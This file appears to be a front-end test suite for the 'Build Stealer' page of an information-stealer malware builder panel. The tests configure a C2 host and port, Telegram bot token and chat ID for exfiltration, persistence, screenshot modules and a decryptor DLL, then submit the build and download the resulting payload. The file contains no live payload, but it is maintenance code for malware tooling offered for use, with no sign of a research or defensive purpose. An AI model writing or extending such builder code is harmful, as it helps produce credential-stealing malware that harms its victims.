import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, screen, waitFor, fireEvent, within } from '@testing-library/react'
import { MemoryRouter } from 'react-router-dom'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { I18nProvider } from '@/lib/i18n'

vi.mock('@/lib/api', () => ({
  api: { get: vi.fn(), post: vi.fn(), put: vi.fn(), del: vi.fn(), fetchCsrf: vi.fn().mockResolvedValue(null), clearCsrf: vi.fn() },
}))

import { api } from '@/lib/api'
import BuildPage from './Build'

const qc = () => new QueryClient({ defaultOptions: { queries: { retry: false } } })
const renderPage = () =>
  render(
    <QueryClientProvider client={qc()}>
      <MemoryRouter>
        <I18nProvider>
          <BuildPage />
        </I18nProvider>
      </MemoryRouter>
    </QueryClientProvider>
  )

const builds = [
  { id: 'bld-11111111', tag: 'v1', build_tag: 'v1', created_at: '2026-01-01', downloads: 3, download_count: 3, file_size: 204800, sha256: 'abcdef1234567890abcdef1234567890' },
  { id: 'bld-22222222', tag: 'v2', build_tag: '', created_at: '2026-02-01', downloads: 0, download_count: 0, file_size: 102400, sha256: 'deadbeef1234567890abcdef1234567890' },
]

const buildResponse = { id: 'bld-33333333', download_url: '/api/build/bld-33333333/download', file_size: 307200, sha256: 'f00dface1234567890abcdef1234567890' }

const originalCreateObjectURL = URL.createObjectURL
const originalRevokeObjectURL = URL.revokeObjectURL

beforeEach(() => {
  vi.mocked(api.get).mockResolvedValue(builds)
  vi.mocked(api.post).mockResolvedValue(buildResponse)
  URL.createObjectURL = vi.fn(() => 'blob:mock-url')
  URL.revokeObjectURL = vi.fn()
  vi.stubGlobal('fetch', vi.fn())
  localStorage.clear()
})

afterEach(() => {
  vi.clearAllMocks()
  vi.unstubAllGlobals()
  URL.createObjectURL = originalCreateObjectURL
  URL.revokeObjectURL = originalRevokeObjectURL
  vi.restoreAllMocks()
})

describe('BuildPage', () => {
  it('shows skeleton rows while builds load', () => {
    const { promise } = Promise.withResolvers<unknown>()
    vi.mocked(api.get).mockReturnValue(promise as never)
    renderPage()
    expect(screen.getByRole('heading', { name: 'Build Stealer' })).toBeInTheDocument()
    expect(document.querySelectorAll('.animate-pulse').length).toBeGreaterThan(0)
  })

  it('renders build history from api.get', async () => {
    renderPage()
    const table = await screen.findByRole('table')
    expect(await within(table).findAllByText('v1')).toHaveLength(2)
    expect(within(table).getByText('abcdef123456..')).toBeInTheDocument()
    expect(within(table).getByText('200 KB')).toBeInTheDocument()
    expect(within(table).getByText('3')).toBeInTheDocument()
    expect(within(table).getAllByRole('button')).toHaveLength(2)
    expect(vi.mocked(api.get)).toHaveBeenCalledWith('/api/build')
  })

  it('renders an empty history when there are no builds', async () => {
    vi.mocked(api.get).mockResolvedValue([])
    renderPage()
    await waitFor(() => expect(vi.mocked(api.get)).toHaveBeenCalledWith('/api/build'))
    expect(screen.queryByText('v1')).not.toBeInTheDocument()
    expect(screen.getByRole('heading', { name: 'Build Stealer' })).toBeInTheDocument()
  })

  it('shows an error query state without crashing', async () => {
    vi.mocked(api.get).mockRejectedValue(new Error('boom'))
    renderPage()
    await waitFor(() => expect(vi.mocked(api.get)).toHaveBeenCalledWith('/api/build'))
    expect(screen.getByRole('heading', { name: 'Build Stealer' })).toBeInTheDocument()
  })

  it('edits config fields and submits the full build config via api.post', async () => {
    renderPage()
    fireEvent.change(screen.getByLabelText('Build Name'), { target: { value: 'my-build' } })
    fireEvent.change(screen.getByLabelText('C2 Host'), { target: { value: '1.2.3.4' } })
    fireEvent.change(screen.getByLabelText('C2 Port'), { target: { value: '9999' } })
    fireEvent.change(screen.getByLabelText('Telegram Bot Token'), { target: { value: 'tg-tok' } })
    fireEvent.change(screen.getByLabelText('Telegram Chat ID'), { target: { value: 'tg-chat' } })
    fireEvent.change(screen.getByLabelText('Build Tag'), { target: { value: 'my-tag' } })

    fireEvent.click(screen.getByText('Modules'))
    fireEvent.click(screen.getByText('System'))
    fireEvent.click(screen.getByLabelText('Enable Screenshot'))
    fireEvent.click(screen.getByText('Advanced'))
    fireEvent.click(screen.getByLabelText('Enable Persistence'))
    fireEvent.click(screen.getByLabelText('Include Decryptor DLL'))

    fireEvent.click(screen.getByRole('button', { name: 'Build' }))
    await waitFor(() =>
      expect(vi.mocked(api.post)).toHaveBeenCalledWith('/api/build', expect.objectContaining({
        build_name: 'my-build',
        c2_host: '1.2.3.4',
        c2_port: 9999,
        telegram_token: 'tg-tok',
        telegram_chat_id: 'tg-chat',
        build_tag: 'my-tag',
        persistence: true,
        include_decryptor: false,
        modules: expect.objectContaining({
          system: expect.objectContaining({ screenshot: false }),
        }),
      }))
    )
    expect(await screen.findByText(/Build complete/)).toBeInTheDocument()
    expect(screen.getByText(/300\.0 KB/)).toBeInTheDocument()
    expect(screen.getByText(/f00dface1234567890abcdef1234567890/)).toBeInTheDocument()
  })

  it('shows an error box when the build fails', async () => {
    vi.mocked(api.post).mockRejectedValue(new Error('compile error'))
    renderPage()
    fireEvent.change(screen.getByLabelText('Build Name'), { target: { value: 'my-build' } })
    fireEvent.click(screen.getByRole('button', { name: 'Build' }))
    expect(await screen.findByText(/Build failed: compile error/)).toBeInTheDocument()
  })

  it('downloads a build via fetch and blob', async () => {
    const clickSpy = vi.fn()
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(clickSpy)
    localStorage.setItem('token', 'tok123')
    vi.mocked(fetch).mockResolvedValue({
      ok: true,
      blob: vi.fn().mockResolvedValue(new Blob(['payload'])),
    } as unknown as Response)
    renderPage()
    const table = await screen.findByRole('table')
    await within(table).findAllByText('v1')
    fireEvent.click(within(table).getAllByRole('button')[0])
    await waitFor(() => expect(clickSpy).toHaveBeenCalled())
    expect(fetch).toHaveBeenCalledWith('/api/build/bld-11111111/download', {
      headers: { Authorization: 'Bearer tok123' },
    })
    expect(URL.createObjectURL).toHaveBeenCalled()
    expect(URL.revokeObjectURL).toHaveBeenCalledWith('blob:mock-url')
  })

  it('logs an error when a download fails', async () => {
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
    vi.mocked(fetch).mockResolvedValue({ ok: false } as unknown as Response)
    renderPage()
    const table = await screen.findByRole('table')
    await within(table).findAllByText('v1')
    fireEvent.click(within(table).getAllByRole('button')[0])
    await waitFor(() => expect(errorSpy).toHaveBeenCalledWith('Build download failed:', expect.any(Error)))
  })
})